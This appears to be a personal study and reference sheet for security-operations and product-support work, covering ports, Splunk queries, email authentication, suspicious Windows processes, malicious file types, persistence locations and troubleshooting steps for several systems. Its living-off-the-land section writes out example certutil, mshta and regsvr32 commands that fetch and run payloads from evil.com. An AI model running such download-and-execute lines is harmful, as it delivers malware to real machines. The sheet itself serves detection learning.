STUDIES & REFERENCE
🌐 Web & HTTP
80TCPHTTP — Unencrypted web traffic. Should see HTTPS instead in modern environments. Suspicious if internal hosts communicate outbound on port 80.
443TCPHTTPS — Encrypted web traffic. Standard for all modern web browsing. Malware often uses 443 to blend in with normal traffic.
8080TCPAlternate HTTP — Often used by web proxies and dev servers. Also commonly used by attackers for reverse shells and C2 communication.
8443TCPAlternate HTTPS — Secondary secure web port. Used by some admin panels and applications.
📁 File Transfer & Remote
21TCPFTP — File Transfer Protocol. Unencrypted. Legacy protocol. Suspicious if seen on modern networks — could indicate data exfiltration.
22TCPSSH — Secure Shell. Encrypted remote access to Linux/Unix systems. Brute force attacks commonly target port 22.
23TCPTelnet — Unencrypted remote access. Should never be seen on modern networks. Immediate red flag if detected.
3389TCPRDP — Remote Desktop Protocol. Windows remote access. High value target for attackers. Brute force and exploitation common. Should never be exposed to internet.
📧 Email Protocols
25TCPSMTP — Email sending between servers. Should only be used by mail servers. Workstations communicating on 25 is suspicious — possible spam bot.
110TCPPOP3 — Email retrieval. Unencrypted. Legacy protocol. Replaced by IMAP and IMAP over SSL.
143TCPIMAP — Email retrieval. Allows email to stay on server. More modern than POP3.
465/587TCPSMTPS — Encrypted email submission. Used by email clients to send mail. 587 is preferred modern standard.
🔧 Network Services
53TCP/UDPDNS — Domain Name System. Translates domain names to IPs. DNS tunneling used by attackers to exfiltrate data. Large DNS queries are suspicious.
67/68UDPDHCP — Assigns IP addresses automatically. Port 67 server, 68 client. APIPA (169.254.x.x) appears when DHCP fails.
123UDPNTP — Network Time Protocol. Keeps clocks synchronized. Important for log correlation — time must be accurate across all systems.
161/162UDPSNMP — Network device monitoring. Old versions have weak security. Used to manage routers, switches, printers.
🪟 Windows Specific
135TCPRPC — Remote Procedure Call. Windows service communication. Used by many Windows services and WMI. Targeted by several exploits.
139TCPNetBIOS — Legacy Windows networking. Should be disabled on modern networks. Part of what was targeted by EternalBlue/WannaCry.
445TCPSMB — Server Message Block. Windows file sharing. EternalBlue exploit targeted this port. Should never be exposed to internet. Disable if not needed.
389/636TCPLDAP/LDAPS — Active Directory communication. 389 unencrypted, 636 encrypted. Used for AD authentication and queries.
⚠️ Common Attack Ports
4444TCPMetasploit default — Default reverse shell port for Metasploit framework. Immediate red flag if seen in network traffic.
1234TCPCommon reverse shell — Frequently used by attackers for reverse shell callbacks. Always investigate outbound connections on this port.
9001TCPTor — Default Tor network port. Could indicate anonymization attempts or C2 over Tor.
6667TCPIRC — Internet Relay Chat. Old protocol still used by some botnets for C2 communication. Suspicious on corporate networks.

🔧 Splunk Troubleshooting
index=main
| stats count by host
FIRST CHECK — verify which hosts are sending logs. If CLIENT01 or FETT missing, forwarder may be stopped. Run on host: Get-Service SplunkForwarder to check status.
index=main host=FETT
| stats count by sourcetype
Verify which log types are being collected from FETT. Should show WinEventLog:Security, WinEventLog:System, WinEventLog:Application. Missing sourcetype means inputs.conf needs updating.
index=main host=FETT
| sort -_time
| head 1
| table _time host sourcetype
Check timestamp of most recent event from FETT. If timestamp is hours old the forwarder stopped sending. Restart with: Restart-Service SplunkForwarder on FETT.
index=main EventCode=4624
| stats count by Account_Name
| sort -count
When Account_Name filter returns nothing — run stats first to see exact format Splunk stored the username. Then copy exact value into your filter. Field values are case sensitive in Splunk filters.
index=main "searchterm"
| table _time host _raw
| sort -_time
When field filters fail — search raw text in quotes. Example: index=main "j.doe" finds any event containing j.doe regardless of which field it is in. Always broaden search before narrowing.

| sort -_time

📧 Email Header Analysis
FromDisplay name — can be anything. NEVER trust just the display name. Always check the actual email address behind it. Example: "PayPal Security" <attacker@gmail.com>
Mailed-ByActual sending server domain. If mailed-by differs from From domain — red flag. In Santander investigation mailed-by matched santander.us — confirmed legitimate.
Signed-ByDKIM signature domain. Cryptographic proof email came from that domain's servers. Cannot be easily faked. Santander email was signed-by santander.us — strong legitimacy indicator.
SPFSender Policy Framework — confirms sending IP is authorized by domain. PASS = IP is on domain's approved sender list. FAIL = possible spoofing. Check in Authentication-Results header.
DKIMDomainKeys Identified Mail — cryptographic email signature. PASS = email was not modified in transit and came from authorized server. Your Santander investigation showed dkim=pass.
DMARCDomain-based Message Authentication — policy that tells receiving servers what to do with failed SPF/DKIM. p=REJECT means spoofed emails get blocked. Santander had p=REJECT — strongest policy.

Time ContextAdmin login at 9am = normal. Same admin login at 3am on a Sunday = investigate immediately. Always check if activity matches normal patterns.

🔵 Normal Windows Processes
svchost.exeService Host — runs Windows services. Multiple instances are NORMAL. Suspicious if: running from wrong path (should be C:\Windows\System32), or has unusual parent process.
lsass.exeLocal Security Authority — handles authentication. Should only run once from System32. If a tool tries to access lsass memory — Mimikatz credential dump attempt.
explorer.exeWindows shell — file manager and desktop. Should run from C:\Windows. Suspicious if running from Temp or AppData folders.
winlogon.exeHandles login/logout. Should only have one instance. Running from anywhere other than System32 is malware.
services.exeService Control Manager — starts and stops services. Should be parent of svchost.exe. If svchost has different parent — red flag.
csrss.exeClient Server Runtime — core Windows process. Should run from System32. Malware commonly masquerades as csrss.exe with typos like cssrs.exe.
🔴 Suspicious Process Behaviors
Wrong Pathsvchost.exe running from C:\Temp instead of C:\Windows\System32. Legitimate Windows processes always run from System32 or SysWOW64. Wrong path = malware masquerading.
Typosquattingsvch0st.exe (zero instead of O), cssrs.exe, lssas.exe. Malware uses names nearly identical to legitimate processes. Always check exact spelling in Process Explorer.
Unusual Parentpowershell.exe spawned by winword.exe. cmd.exe spawned by excel.exe. These Office apps should never spawn command line tools — malicious macro indicator.
No SignatureLegitimate Windows processes are always digitally signed by Microsoft. Unsigned process in System32 is a major red flag. Check with Process Explorer VirusTotal integration.
Temp ExecutionAny executable running from C:\Temp, C:\Users\[user]\AppData\Local\Temp, or Downloads folder. Malware frequently drops payloads in temp directories.
Network + CodeProcess making outbound connections that should not need internet. Example: notepad.exe connecting to 185.220.x.x — notepad never needs network access.

.xlsmExcel with macros. Example: payroll_2026.xlsm — same risk as docm but in spreadsheet form. Finance departments targeted frequently with fake payroll or invoice files.
.pdfPDFs can contain embedded JavaScript or malicious links. Example: contract_signed.pdf — PDF with embedded script that exploits Adobe Reader. Always open in browser not desktop app.
.docxStandard Word document — lower risk than docm but can contain external OLE objects or template injection. Example: job_application.docx loading remote template with malicious macro.
.oneMicrosoft OneNote file. Recently abused heavily. Example: instructions.one — OneNote files can embed and execute scripts. Became popular after Office disabled macros by default.
.rtfRich Text Format — can contain embedded objects. Example: meeting_notes.rtf — RTF files have been used to exploit Word via embedded OLE objects without needing macros.
📦 Archive & Container Threats
.zipArchives bypass email attachment filters. Example: invoice.zip containing invoice.exe — security tools scan the zip but may miss the executable inside. Always extract and scan contents.
.rarCompressed archive — same risk as zip. Password protected RARs are used to bypass email scanning since scanner cannot open encrypted archive to check contents.
.7z7-Zip archive — commonly password protected in attacks. Example: documents_confidential.7z with password in email body — password prevents AV scanning of contents.
.imgDisk image similar to ISO. Example: software_crack.img — mounts as virtual drive in Windows. Contents bypass Mark of the Web protection same as ISO files.
🔧 Living Off The Land (LOLBAS)
certutilLegitimate Windows tool abused to download files. Example: certutil -urlcache -f http://evil.com/payload.exe C:\Temp\payload.exe — downloads malware using trusted Windows binary. Generates suspicious 4688 event.
mshtaRuns HTML Applications. Abused to execute remote scripts. Example: mshta http://evil.com/payload.hta — downloads and runs malicious HTA without saving to disk first.
regsvr32Registers COM objects — abused to run malicious DLLs. Example: regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll — Squiblydoo attack bypasses AppLocker.
wscriptWindows Script Host runs VBS and JS files. Example: wscript.exe malware.vbs — often spawned by email attachments or malicious downloads.
powershellMost abused LOLBAS tool. Example: powershell -enc [base64] — encoded commands hide malicious content from basic inspection. Always decode Base64 in CyberChef to see real command.
rundll32Runs DLL files — abused to execute malicious DLLs. Example: rundll32.exe evil.dll,EntryPoint — loads and executes attacker controlled DLL using trusted Windows process.
🦠 Malware Categories
RansomwareEncrypts files and demands payment. Example: WannaCry encrypted files renaming them .WNCRY. Indicators: mass file modifications, new file extensions, ransom note text files, VSS deletion commands.
RATRemote Access Trojan — gives attacker full control. Example: njRAT, AsyncRAT. Establishes persistent outbound connection to C2 server. Generates unusual outbound connections on non-standard ports.
InfostealerSteals credentials, cookies, crypto wallets. Example: Redline Stealer, Raccoon. Targets browser saved passwords, session cookies. Huntress ITDR detects stolen session cookie reuse.
KeyloggerRecords keystrokes to capture passwords. Example: every key you type sent to attacker. Often bundled with other malware. Detected by monitoring suspicious process hooks on lsass.exe.
RootkitHides malware from OS and security tools. Operates at kernel level. Very difficult to detect — requires specialized tools. Huntress EDR monitors at driver level to catch rootkit behavior.
WiperDestroys data — no ransom, just destruction. Example: NotPetya. Nation-state weapon. Overwrites MBR and files making system unbootable. No recovery without clean backups.
🛡️ Common Persistence Locations
Run KeysRegistry: HKLM\Software\Microsoft\Windows\CurrentVersion\Run — programs here run at every startup. Check with Autoruns. Example: malware adds itself here to survive reboots. Generates no event ID — only visible in registry.
Startup FolderC:\Users\[user]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup — anything here runs when user logs in. Easy persistence location — no admin needed.
Scheduled TasksTask Scheduler used to run malware on schedule. Example: task named "WindowsUpdate" running payload.exe every hour. Check with: schtasks /query /fo LIST /v in PowerShell.
ServicesEvent ID 7045 — new service installed. Malware installs as service for automatic startup. Example: service named "svc_update" pointing to C:\Temp\malware.exe.
DLL HijackingPlacing malicious DLL where legitimate application loads it first. Application runs, loads malicious DLL instead of real one. Attacker gets code execution every time app runs.
WMI SubscriptionsWindows Management Instrumentation event subscriptions — fileless persistence that survives reboots with no files on disk. Very stealthy. Detected by monitoring WMI activity in Sysmon logs.
📌 PRODUCT SUPPORT TROUBLESHOOTING REFERENCE
Structured troubleshooting for entry level Product Support and TSE roles. Always follow the same methodology: 1) Identify the problem → 2) Gather info → 3) Isolate cause → 4) Apply fix → 5) Verify → 6) Document. Start with the simplest explanation before assuming complex causes.
🌐 Network Connectivity — Universal Steps
Step 1Ask the customer: Is it one device or all devices affected? One device = local issue. All devices = router/ISP/network issue. This single question determines your entire troubleshooting path.
Step 2Check physical connection first. Is ethernet cable plugged in? Is WiFi enabled? Are any lights off on the router or switch? Physical layer issues are the most common and fastest to fix.
Step 3Verify IP address is assigned. Windows: ipconfig. Linux/Mac: ifconfig or ip addr. If showing 169.254.x.x (APIPA) — DHCP failed. If showing 0.0.0.0 — no connection at all.
Step 4Ping the gateway (router). Windows: ping 192.168.1.1. If ping fails = cannot reach router. If ping succeeds = local network works, problem is internet side.
Step 5Ping external IP: ping 8.8.8.8. If this works but websites don't load = DNS problem not connectivity. If this fails = internet connection down.
Step 6Test DNS: ping google.com. If 8.8.8.8 works but google.com fails = DNS resolution broken. Fix: change DNS to 8.8.8.8 manually or flush DNS cache.
Step 7If all above fails — restart in order: modem first, wait 60 seconds, then router, wait 30 seconds, then device. This resolves majority of connectivity issues.
🪟 Windows Troubleshooting
No InternetCMD as Admin: netsh winsock reset → netsh int ip reset → ipconfig /release → ipconfig /flushdns → ipconfig /renew → restart. This resets entire network stack. Fixes most Windows connectivity issues.
Slow PCCheck Task Manager (Ctrl+Shift+Esc): CPU, Memory, Disk columns. Identify top consumer. High disk usage = check for Windows Update running or malware scan. High CPU = identify process and check legitimacy in Process Explorer.
App Won't StartRight click → Run as Administrator first. If still fails: Check Event Viewer → Windows Logs → Application for errors at time of crash. Note Event ID and error message for troubleshooting.
Windows Update StuckServices.msc → Stop Windows Update service → Delete contents of C:\Windows\SoftwareDistribution\Download → Start Windows Update service → Try update again.
Can't LoginCheck Caps Lock. Try PIN instead of password. If domain account — check if account is locked in AD (Event ID 4740). Reset password from DC if needed. Check if DC is reachable: ping 192.168.15.44.
Blue ScreenNote the stop code shown. Check Event Viewer → Windows Logs → System for Critical errors at crash time. Common causes: bad driver update, RAM failure, storage issues. Run: sfc /scannow in CMD as Admin.
DNS FixCMD as Admin: ipconfig /flushdns clears cached DNS entries. If DNS still broken: Change adapter DNS to 8.8.8.8 manually via Network Settings → Adapter Properties → IPv4 → Use following DNS.
Agent Not ShowingHuntress/security agent not appearing in dashboard: 1) services.msc — is agent service running? 2) Check AV quarantine for agent files. 3) Add AV exclusions for agent folder. 4) Test-NetConnection to cloud endpoint on required port.
🐧 Linux Troubleshooting
No InternetCheck IP: ip addr show. No IP = run: sudo dhclient eth0. Check routing: ip route show — should show default gateway. Test gateway: ping [gateway IP]. Check DNS: cat /etc/resolv.conf — should show nameserver entry.
Service DownCheck status: systemctl status servicename. Start it: sudo systemctl start servicename. Enable on boot: sudo systemctl enable servicename. View logs: journalctl -u servicename -n 50 for last 50 log entries.
Permission DeniedAdd sudo before command. If still denied check file permissions: ls -la filename. Change ownership: sudo chown user:group filename. Change permissions: sudo chmod 755 filename. Check if user is in correct group: id username.
Disk FullCheck space: df -h. Find large files: sudo du -sh /* | sort -rh | head 10. Clear logs: sudo journalctl --vacuum-size=100M. For Splunk specifically clear old indexes or increase disk allocation in VMware.
SSH FailsTest connectivity: ping [target IP]. Check SSH service: systemctl status ssh. Verify port 22 open: nmap -p 22 [target]. Check firewall: sudo ufw status. Verify credentials and that user exists on target system.
Splunk DownCheck status: sudo /opt/splunk/bin/splunk status. Start: sudo /opt/splunk/bin/splunk start. Check logs: tail -50 /opt/splunk/var/log/splunk/splunkd.log. Verify ports: ss -tulpn | grep -E "8000|9997".
Package Won't InstallUpdate repos first: sudo apt update. If dependency error: sudo apt install -f to fix broken dependencies. If GPG error: sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys [KEY]. Check internet connectivity first.
🍎 macOS Troubleshooting
No InternetSystem Settings → Network → select interface → Renew DHCP Lease. Terminal: sudo dscacheutil -flushcache && sudo killall -HUP mDNSResponder to flush DNS. Turn WiFi off and on. Check router connectivity from another device.
Slow MacOpen Activity Monitor (Applications → Utilities). Check CPU and Memory tabs. Identify top process. Spinning beach ball = system overloaded. Check for runaway processes — force quit if unresponsive. Check storage: About This Mac → Storage.
App Won't OpenRight click app → Open (bypasses Gatekeeper for first run). If blocked by security: System Settings → Privacy & Security → Allow app. Check Console app for crash logs. Delete app preferences: ~/Library/Preferences/[app.plist].
Gatekeeper BlockmacOS security feature blocks unsigned apps. Fix: System Settings → Privacy & Security → scroll down → click Open Anyway next to blocked app. Or Terminal: sudo spctl --master-disable (disables Gatekeeper entirely — use cautiously).
Agent Install FailsCheck System Settings → Privacy & Security → Full Disk Access — add agent. Check Privacy & Security → Accessibility — add agent. macOS requires explicit permission grants for security software. SIP may need consideration for kernel extensions.
Terminal CommandsCheck IP: ifconfig en0 (WiFi) or en1 (ethernet). Ping: ping -c 4 8.8.8.8. Flush DNS: sudo dscacheutil -flushcache. Check processes: ps aux | grep processname. Restart service: sudo launchctl stop/start [service].
FileVault IssuesDisk encryption can slow performance during first encryption. Check status: Terminal → fdesetup status. If FileVault preventing boot — use Recovery Mode (hold Cmd+R at startup) to disable or troubleshoot encryption issues.
📱 Android Troubleshooting
No WiFiForget network and reconnect. Toggle airplane mode on and off. Check if other devices connect to same network. Settings → Network → WiFi → Advanced → check IP settings (should be DHCP not static unless intentional). Restart device.
No Mobile DataSettings → Network → Mobile Network → verify data enabled. Check APN settings match carrier requirements. Toggle airplane mode. Reinsert SIM card. Contact carrier if still failing — may be account or tower issue.
App IssuesSettings → Apps → select app → Clear Cache first. If still failing → Clear Data (loses app settings). Force Stop then reopen. Uninstall and reinstall. Check storage space — low storage causes many app issues.
Slow DeviceSettings → Developer Options → Running Services to see what is consuming RAM. Clear cached data: Settings → Storage → Cached Data → Clear. Check for apps running in background. Factory reset as last resort.
Security AppMDM or security agent issues: Settings → Device Admin Apps — verify agent has required permissions. Settings → Accessibility — check agent is enabled. Battery optimization may be killing agent — Settings → Battery → exempt agent from optimization.
🔐 Active Directory Troubleshooting
Can't LoginCheck account status in AD Users and Computers → find user → Properties → Account tab → is "Unlock account" checkbox visible? If yes account is locked. Check Event ID 4740 in Splunk for lockout source. Reset password if needed.
GPO Not ApplyingRun gpupdate /force on affected machine. Check gpresult /r to see which GPOs are applied. Verify machine is in correct OU. Check GPO is linked to correct OU. Verify GPO is not blocked or overridden by another policy.
Domain Join FailsVerify DNS points to DC: nslookup fett.local should resolve. Check DC is reachable: ping 192.168.15.44. Verify credentials have domain join permissions. Check machine name is not already in AD. Ensure time sync is correct — Kerberos fails if time differs more than 5 minutes.
Replication IssuesCMD on DC: repadmin /showrepl to check replication status. repadmin /replsummary for summary view. dcdiag /test:replications to run diagnostics. Check Event Viewer on DC for Directory Service errors.
Audit PolicyIf Event IDs not appearing in logs: auditpol /get /category:* to check all audit settings. Enable specific category: auditpol /set /subcategory:"Security Group Management" /success:enable. Verify with gpresult /r that audit policy GPO is applied.
Group MembershipGlobal group additions generate Event ID 4728. Local group = 4732. Universal group = 4756. Always check group scope in AD before searching Splunk. Verify audit policy is set to Success for Account Management category.
🛡️ Security Software Troubleshooting
AV ConflictSecurity agent quarantined by AV: Open AV → Quarantine → restore files → add exclusions for agent folder path. Single device = fix locally. Multiple devices = update AV policy in RMM or GPO to push exclusions to all machines simultaneously.
Agent Offline1) Check service is running: services.msc. 2) Check AV is not blocking agent processes. 3) Test outbound connectivity to agent cloud endpoint. 4) Check firewall rules — agent needs outbound HTTPS (443). 5) Reinstall agent if all above passes.
False PositiveVerify file is legitimate: check publisher signature in Process Explorer, submit hash to VirusTotal, check file path (System32 = likely legit, Temp = suspicious). If confirmed safe: restore from quarantine, add exclusion, document finding. Always verify before excluding.
High CPU from AVAV scanning causing performance issues: Check if full scan is running (scheduled scan). Exclude development folders, build directories, and VM files from real-time scanning. These cause excessive IO without security benefit.
No Alerts FiringCheck audit policy is enabled. Verify SIEM is receiving logs: check forwarder status on endpoint. Verify detection rules are active. Test with known safe action (create user account) and confirm Event ID appears in SIEM within 60 seconds.
RMM Deployment FailsAgent deployment via RMM failing: Check target machine is online. Verify RMM service account has admin rights on target. Check Windows Firewall allows RMM ports. Review RMM deployment logs for specific error. Try manual install on one machine to isolate whether issue is RMM or endpoint.
📋 Troubleshooting Methodology
1 — IdentifyWhat exactly is the problem? Get specific error messages, screenshots, Event IDs. When did it start? What changed? One device or many? Gathering this information first saves significant time and prevents guessing.
2 — ScopeIs it isolated to one user, one machine, one site, or widespread? Scope determines urgency and approach. Widespread = infrastructure issue (DC, DNS, DHCP). Single machine = local configuration. Single user = account or profile issue.
3 — ReproduceCan you reproduce the issue consistently? If yes — easier to troubleshoot. If intermittent — check logs for patterns (time of day, specific user, specific action). Intermittent issues often point to resource constraints or network instability.
4 — IsolateNarrow down the cause. Start broad then get specific. Network issue? → which layer. Application issue? → which component. Always rule out the simplest causes first before assuming complex ones.
5 — FixApply one fix at a time. If you change multiple things simultaneously you cannot determine what actually fixed it. Document each change made. If fix does not work — revert before trying next approach.
6 — VerifyConfirm the fix actually resolved the issue from the customer's perspective. Do not assume it is fixed — have them confirm. Check logs to verify expected behavior is restored. Monitor for recurrence.
7 — DocumentRecord what the problem was, what caused it, what fixed it. This builds your knowledge base and helps teammates. Good documentation is what separates a good support analyst from a great one.
EscalateKnow when to escalate. If issue is beyond your current scope — escalate early rather than late. Give the next tier everything you have gathered: steps tried, error messages, logs, scope. Never sit on a ticket hoping it resolves itself.
